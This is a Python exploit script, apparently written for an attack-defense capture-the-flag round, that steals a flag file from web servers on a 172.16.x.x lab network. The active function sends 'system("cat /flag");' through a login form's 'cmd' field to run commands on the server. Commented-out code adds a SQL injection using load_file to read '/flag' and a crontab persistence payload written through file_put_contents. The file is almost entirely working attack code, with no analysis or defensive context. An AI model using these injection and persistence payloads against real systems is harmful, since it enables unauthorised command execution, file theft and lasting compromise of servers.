#!/usr/bin/env python
# -*- coding: utf-8 -*-
from termcolor import *
import sys
import requests

import random
import string


# def get_flag(host, port):
#     print "[+] Getting flag of %s:%d" % (host, port)
#     url = "http://%s:%d/" % (host, port)
#     s = requests.session()
#     username = ''.join(random.sample(string.ascii_letters + string.digits, 4)) + "'union select 1,2,3,load_file('/flag')#"
#     password = ''.join(random.sample(string.ascii_letters + string.digits, 32))
#     r = s.post(url + "register.php", data = {'username': username, 'password': password}, timeout=5)
#     r = s.post(url + "login.php", data = {'username': username, 'password': password}, timeout=5,)
#     r = s.get(url + "ebank.php", timeout=5)
#     text = r.content
#     flag = text.split("您的账户余额：</h2>")[1].split("<h2>")[1].split(' CTF')[0].strip()
#     print("[+] first sqli result: " + flag + '\n')
#     return flag

def get_flag(host, port):
    url = "http://" + host + "/"
    s = requests.session()
    username = ''.join(random.sample(string.ascii_letters + string.digits, 32))
    password = ''.join(random.sample(string.ascii_letters + string.digits, 32))
    r = s.post(url + "register.php", data = {'username': username, 'password': password}, timeout=5)
    # payload = "file_put_contents('%s', '%s');" % ("/var/www/html/1.php","* * * * * cat /flag > /var/www/html/helloflag\n")
    # r = s.post(url + "login.php", data = {'username': username, 'password': password, 'cmd': payload}, timeout=5, allow_redirects=False)
    # payload = 'system("%s");' % "crontab /var/www/html/1.php"
    # r = s.post(url + "login.php", data = {'username': username, 'password': password, 'cmd': payload}, timeout=5, allow_redirects=False)
    r = s.post(url + "login.php", data = {'username': username, 'password': password, 'cmd': 'system("cat /flag");'}, timeout=5, allow_redirects=False)
    flag = r.text.split('<')[0].strip()
    return flag

def main():
    get_flag("172.16.%s.102" % (sys.argv[1]), "20002")

if __name__ == "__main__":
    main()
